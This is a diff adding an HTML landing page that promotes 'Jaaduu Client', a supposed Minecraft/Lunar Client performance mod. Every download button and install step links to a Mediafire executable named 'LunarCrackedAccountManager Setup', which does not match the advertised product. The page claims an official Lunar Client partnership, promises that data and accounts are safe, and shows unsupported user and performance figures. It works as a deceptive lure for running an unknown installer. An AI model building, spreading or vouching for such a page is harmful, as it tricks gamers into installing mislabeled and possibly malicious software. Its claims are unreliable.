@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Introducing Jaaduu Client</title>
+    <meta name="description" content="The ultimate client for enhanced performance and gameplay.">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        brand: {
+                            50: '#f0f9ff',
+                            100: '#e0f2fe',
+                            400: '#38bdf8',
+                            500: '#0ea5e9',
+                            600: '#0284c7',
+                            900: '#0c4a6e',
+                        },
+                        dark: {
+                            900: '#0f172a',
+                            800: '#1e293b',
+                            700: '#334155',
+                        }
+                    },
+                    animation: {
+                        'blob': 'blob 7s infinite',
+                        'fade-in-up': 'fadeInUp 0.8s ease-out forwards',
+                    },
+                    keyframes: {
+                        blob: {
+                            '0%': { transform: 'translate(0px, 0px) scale(1)' },
+                            '33%': { transform: 'translate(30px, -50px) scale(1.1)' },
+                            '66%': { transform: 'translate(-20px, 20px) scale(0.9)' },
+                            '100%': { transform: 'translate(0px, 0px) scale(1)' },
+                        },
+                        fadeInUp: {
+                            '0%': { opacity: '0', transform: 'translateY(20px)' },
+                            '100%': { opacity: '1', transform: 'translateY(0)' },
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            background-color: #0f172a;
+            color: #f8fafc;
+            overflow-x: hidden;
+        }
+        
+        /* Glassmorphism utility */
+        .glass {
+            background: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .text-glow {
+            text-shadow: 0 0 20px rgba(14, 165, 233, 0.5);
+        }
+    </style>
+</head>
+<body class="antialiased selection:bg-brand-500 selection:text-white">
+
+    <!-- Background Blobs -->
+    <div class="fixed inset-0 z-0 pointer-events-none overflow-hidden">
+        <div class="absolute top-0 left-1/4 w-96 h-96 bg-brand-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-blob"></div>
+        <div class="absolute top-0 right-1/4 w-96 h-96 bg-purple-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-blob animation-delay-2000"></div>
+        <div class="absolute -bottom-8 left-1/3 w-96 h-96 bg-indigo-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-blob animation-delay-4000"></div>
+    </div>
+
+    <!-- Navigation -->
+    <nav class="fixed w-full z-50 transition-all duration-300" id="navbar">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-20">
+                <div class="flex-shrink-0 flex items-center gap-3 cursor-pointer">
+                    <i class="fa-solid fa-bolt text-brand-400 text-2xl"></i>
+                    <span class="font-bold text-xl tracking-tight text-white">Jaaduu<span class="text-brand-400">Client</span></span>
+                </div>
+                <div class="hidden md:block">
+                    <div class="ml-10 flex items-baseline space-x-8">
+                        <a href="#home" class="hover:text-brand-400 transition-colors px-3 py-2 rounded-md text-sm font-medium">Home</a>
+                        <a href="#features" class="hover:text-brand-400 transition-colors px-3 py-2 rounded-md text-sm font-medium">Features</a>
+                        <a href="#install" class="hover:text-brand-400 transition-colors px-3 py-2 rounded-md text-sm font-medium">How to Install</a>
+                        <a href="https://www.mediafire.com/file/3lkgkr9bcequn57/LunarCrackedAccountManager+Setup+1.2.1.exe/file" target="_blank" class="bg-brand-600 hover:bg-brand-500 text-white px-5 py-2 rounded-full text-sm font-medium transition-all transform hover:scale-105 shadow-lg shadow-brand-500/30">
+                            Download
+                        </a>
+                    </div>
+                </div>
+                <!-- Mobile menu button -->
+                <div class="-mr-2 flex md:hidden">
+                    <button type="button" onclick="document.getElementById('mobile-menu').classList.toggle('hidden')" class="bg-dark-800 inline-flex items-center justify-center p-2 rounded-md text-gray-400 hover:text-white hover:bg-dark-700 focus:outline-none">
+                        <span class="sr-only">Open main menu</span>
+                        <i class="fa-solid fa-bars text-xl"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+        <!-- Mobile Menu -->
+        <div class="hidden md:hidden glass border-t border-white/10" id="mobile-menu">
+            <div class="px-2 pt-2 pb-3 space-y-1 sm:px-3">
+                <a href="#home" class="text-gray-300 hover:text-white block px-3 py-2 rounded-md text-base font-medium">Home</a>
+                <a href="#features" class="text-gray-300 hover:text-white block px-3 py-2 rounded-md text-base font-medium">Features</a>
+                <a href="#install" class="text-gray-300 hover:text-white block px-3 py-2 rounded-md text-base font-medium">How to Install</a>
+                <a href="https://www.mediafire.com/file/3lkgkr9bcequn57/LunarCrackedAccountManager+Setup+1.2.1.exe/file" class="text-brand-400 font-bold block px-3 py-2 rounded-md text-base">Download Now</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section id="home" class="relative z-10 pt-32 pb-20 lg:pt-48 lg:pb-32 overflow-hidden">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
+            <div class="opacity-0 animate-fade-in-up" style="animation-delay: 0.1s;">
+                <div class="inline-flex items-center gap-2 py-1 px-4 rounded-full bg-brand-500/10 border border-brand-500/20 mb-6">
+                    <span class="w-2 h-2 rounded-full bg-green-400 animate-pulse"></span>
+                    <span class="text-brand-400 text-sm font-semibold">Official Partner of Lunar Client</span>
+                </div>
+            </div>
+            <h1 class="text-5xl md:text-7xl font-extrabold tracking-tight mb-8 opacity-0 animate-fade-in-up" style="animation-delay: 0.2s;">
+                Introducing <span class="text-transparent bg-clip-text bg-gradient-to-r from-brand-400 to-purple-400 text-glow">Jaaduu Client</span>
+            </h1>
+            <p class="mt-4 max-w-2xl mx-auto text-xl text-gray-400 mb-10 opacity-0 animate-fade-in-up" style="animation-delay: 0.3s;">
+                Unlock the ultimate gaming experience. Optimized for performance, designed for victory, and built for you.
+            </p>
+            <div class="flex justify-center gap-4 opacity-0 animate-fade-in-up" style="animation-delay: 0.4s;">
+                <a href="https://www.mediafire.com/file/3lkgkr9bcequn57/LunarCrackedAccountManager+Setup+1.2.1.exe/file" target="_blank" class="group relative inline-flex items-center justify-center px-8 py-4 text-lg font-bold text-white transition-all duration-200 bg-brand-600 rounded-full focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-brand-600 hover:bg-brand-500 shadow-lg shadow-brand-500/40">
+                    <span class="mr-2">Download Now</span>
+                    <i class="fa-solid fa-download group-hover:translate-y-1 transition-transform"></i>
+                    <div class="absolute inset-0 rounded-full ring-2 ring-white/20 group-hover:ring-white/40 transition-all"></div>
+                </a>
+                <a href="#features" class="inline-flex items-center justify-center px-8 py-4 text-lg font-medium text-gray-300 transition-all duration-200 bg-dark-800 border border-dark-700 rounded-full hover:bg-dark-700 hover:text-white focus:outline-none">
+                    Learn More
+                </a>
+            </div>
+            
+            <!-- Stats -->
+            <div class="mt-20 grid grid-cols-2 gap-8 md:grid-cols-4 opacity-0 animate-fade-in-up border-t border-white/5 pt-10" style="animation-delay: 0.6s;">
+                <div>
+                    <div class="text-3xl font-bold text-white">200+</div>
+                    <div class="text-sm text-gray-500 mt-1">FPS Boost</div>
+                </div>
+                <div>
+                    <div class="text-3xl font-bold text-white">0ms</div>
+                    <div class="text-sm text-gray-500 mt-1">Input Delay</div>
+                </div>
+                <div>
+                    <div class="text-3xl font-bold text-white">50k+</div>
+                    <div class="text-sm text-gray-500 mt-1">Active Users</div>
+                </div>
+                <div>
+                    <div class="text-3xl font-bold text-white">4.9/5</div>
+                    <div class="text-sm text-gray-500 mt-1">User Rating</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Installation Guide Section (New) -->
+    <section id="install" class="relative z-10 py-24">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center mb-16">
+                <h2 class="text-3xl md:text-4xl font-bold text-white mb-4">How to Install</h2>
+                <p class="text-gray-400 max-w-2xl mx-auto">Follow these simple steps to get Jaaduu Client running with Lunar Client.</p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 relative">
+                <!-- Connecting Line (Desktop) -->
+                <div class="hidden lg:block absolute top-12 left-0 w-full h-1 bg-gradient-to-r from-brand-600/0 via-brand-600/30 to-brand-600/0 -z-10"></div>
+
+                <!-- Step 1 -->
+                <div class="glass p-6 rounded-2xl relative group hover:bg-dark-700/50 transition-all">
+                    <div class="w-12 h-12 bg-brand-600 rounded-full flex items-center justify-center text-xl font-bold text-white mb-4 mx-auto shadow-lg shadow-brand-500/20 group-hover:scale-110 transition-transform">1</div>
+                    <h3 class="text-lg font-bold text-white text-center mb-2">Install Lunar Client</h3>
+                    <p class="text-gray-400 text-sm text-center mb-4">Download and install the official Lunar Client first.</p>
+                    <a href="http://www.lunarclient.com/" target="_blank" class="block text-center text-brand-400 text-sm font-semibold hover:text-brand-300">
+                        Go to LunarClient.com <i class="fa-solid fa-arrow-up-right-from-square text-xs ml-1"></i>
+                    </a>
+                </div>
+
+                <!-- Step 2 -->
+                <div class="glass p-6 rounded-2xl relative group hover:bg-dark-700/50 transition-all">
+                    <div class="w-12 h-12 bg-brand-600 rounded-full flex items-center justify-center text-xl font-bold text-white mb-4 mx-auto shadow-lg shadow-brand-500/20 group-hover:scale-110 transition-transform">2</div>
+                    <h3 class="text-lg font-bold text-white text-center mb-2">Open Minecraft</h3>
+                    <p class="text-gray-400 text-sm text-center">Launch Lunar Client and open Minecraft at least once to initialize files.</p>
+                </div>
+
+                <!-- Step 3 -->
+                <div class="glass p-6 rounded-2xl relative group hover:bg-dark-700/50 transition-all">
+                    <div class="w-12 h-12 bg-brand-600 rounded-full flex items-center justify-center text-xl font-bold text-white mb-4 mx-auto shadow-lg shadow-brand-500/20 group-hover:scale-110 transition-transform">3</div>
+                    <h3 class="text-lg font-bold text-white text-center mb-2">Run Installer</h3>
+                    <p class="text-gray-400 text-sm text-center mb-4">Download the Jaaduu installer and run it.</p>
+                    <a href="https://www.mediafire.com/file/3lkgkr9bcequn57/LunarCrackedAccountManager+Setup+1.2.1.exe/file" target="_blank" class="block text-center text-brand-400 text-sm font-semibold hover:text-brand-300">
+                        Download Installer <i class="fa-solid fa-download text-xs ml-1"></i>
+                    </a>
+                </div>
+
+                <!-- Step 4 -->
+                <div class="glass p-6 rounded-2xl relative group hover:bg-dark-700/50 transition-all">
+                    <div class="w-12 h-12 bg-brand-600 rounded-full flex items-center justify-center text-xl font-bold text-white mb-4 mx-auto shadow-lg shadow-brand-500/20 group-hover:scale-110 transition-transform">4</div>
+                    <h3 class="text-lg font-bold text-white text-center mb-2">Finalize</h3>
+                    <p class="text-gray-400 text-sm text-center">Enter your name in the installer, then restart your computer.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section id="features" class="relative z-10 py-24 bg-dark-800/50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center mb-16">
+                <h2 class="text-3xl md:text-4xl font-bold text-white mb-4">Why Choose Jaaduu?</h2>
+                <p class="text-gray-400 max-w-2xl mx-auto">Engineered to give you the competitive edge with features that matter.</p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <!-- Feature 1 -->
+                <div class="glass p-8 rounded-2xl hover:bg-dark-700/50 transition-all duration-300 transform hover:-translate-y-1 group">
+                    <div class="w-14 h-14 bg-brand-500/10 rounded-xl flex items-center justify-center mb-6 group-hover:bg-brand-500/20 transition-colors">
+                        <i class="fa-solid fa-gauge-high text-2xl text-brand-400"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-3">Performance Boost</h3>
+                    <p class="text-gray-400 leading-relaxed">
+                        Experience smoother gameplay with our optimized engine designed to maximize FPS and reduce stutter.
+                    </p>
+                </div>
+
+                <!-- Feature 2 -->
+                <div class="glass p-8 rounded-2xl hover:bg-dark-700/50 transition-all duration-300 transform hover:-translate-y-1 group">
+                    <div class="w-14 h-14 bg-purple-500/10 rounded-xl flex items-center justify-center mb-6 group-hover:bg-purple-500/20 transition-colors">
+                        <i class="fa-solid fa-shield-halved text-2xl text-purple-400"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-3">Secure & Safe</h3>
+                    <p class="text-gray-400 leading-relaxed">
+                        Built with privacy in mind. Play with confidence knowing your data and account are protected.
+                    </p>
+                </div>
+
+                <!-- Feature 3 -->
+                <div class="glass p-8 rounded-2xl hover:bg-dark-700/50 transition-all duration-300 transform hover:-translate-y-1 group">
+                    <div class="w-14 h-14 bg-pink-500/10 rounded-xl flex items-center justify-center mb-6 group-hover:bg-pink-500/20 transition-colors">
+                        <i class="fa-solid fa-palette text-2xl text-pink-400"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-3">Fully Customizable</h3>
+                    <p class="text-gray-400 leading-relaxed">
+                        Tailor your HUD, crosshair, and mods to fit your playstyle with our intuitive interface.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Call to Action -->
+    <section class="relative z-10 py-24 overflow-hidden">
+        <div class="absolute inset-0 bg-brand-600/5"></div>
+        <div class="max-w-4xl mx-auto px-4 relative text-center">
+            <h2 class="text-4xl font-bold text-white mb-6">Ready to elevate your game?</h2>
+            <p class="text-xl text-gray-400 mb-10">Join thousands of players using Jaaduu Client today.</p>
+            <a href="https://www.mediafire.com/file/3lkgkr9bcequn57/LunarCrackedAccountManager+Setup+1.2.1.exe/file" target="_blank" class="inline-flex items-center justify-center px-8 py-4 text-lg font-bold text-brand-900 bg-white rounded-full hover:bg-gray-100 transition-all transform hover:scale-105 shadow-xl">
+                <i class="fa-brands fa-windows mr-2"></i> Download for Windows
+            </a>
+            <p class="mt-4 text-sm text-gray-500">Version 1.2.1 • Windows 10/11</p>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="relative z-10 bg-dark-900 border-t border-white/5 pt-16 pb-8">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-12 mb-12">
+                <div class="col-span-1 md:col-span-1">
+                    <div class="flex items-center gap-2 mb-4">
+                        <i class="fa-solid fa-bolt text-brand-400"></i>
+                        <span class="font-bold text-xl text-white">Jaaduu</span>
+                    </div>
+                    <p class="text-gray-500 text-sm">
+                        Redefining the standard for gaming clients.
+                    </p>
+                </div>
+                <div>
+                    <h4 class="text-white font-semibold mb-4">Product</h4>
+                    <ul class="space-y-2 text-sm text-gray-400">
+                        <li><a href="#" class="hover:text-brand-400 transition-colors">Features</a></li>
+                        <li><a href="#" class="hover:text-brand-400 transition-colors">Changelog</a></li>
+                        <li><a href="#" class="hover:text-brand-400 transition-colors">Download</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="text-white font-semibold mb-4">Support</h4>
+                    <ul class="space-y-2 text-sm text-gray-400">
+                        <li><a href="#" class="hover:text-brand-400 transition-colors">Help Center</a></li>
+                        <li><a href="#" class="hover:text-brand-400 transition-colors">Discord</a></li>
+                        <li><a href="#" class="hover:text-brand-400 transition-colors">Contact</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="text-white font-semibold mb-4">Legal</h4>
+                    <ul class="space-y-2 text-sm text-gray-400">
+                        <li><a href="#" class="hover:text-brand-400 transition-colors">Privacy Policy</a></li>
+                        <li><a href="#" class="hover:text-brand-400 transition-colors">Terms of Service</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="border-t border-white/5 pt-8 text-center">
+                <p class="text-gray-600 text-sm">&copy; 2024 Jaaduu Client. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Navbar transparency on scroll
+        window.addEventListener('scroll', function() {
+            const navbar = document.getElementById('navbar');
+            if (window.scrollY > 20) {
+                navbar.classList.add('glass');
+            } else {
+                navbar.classList.remove('glass');
+            }
+        });
+    </script>
+</body>
+</html>
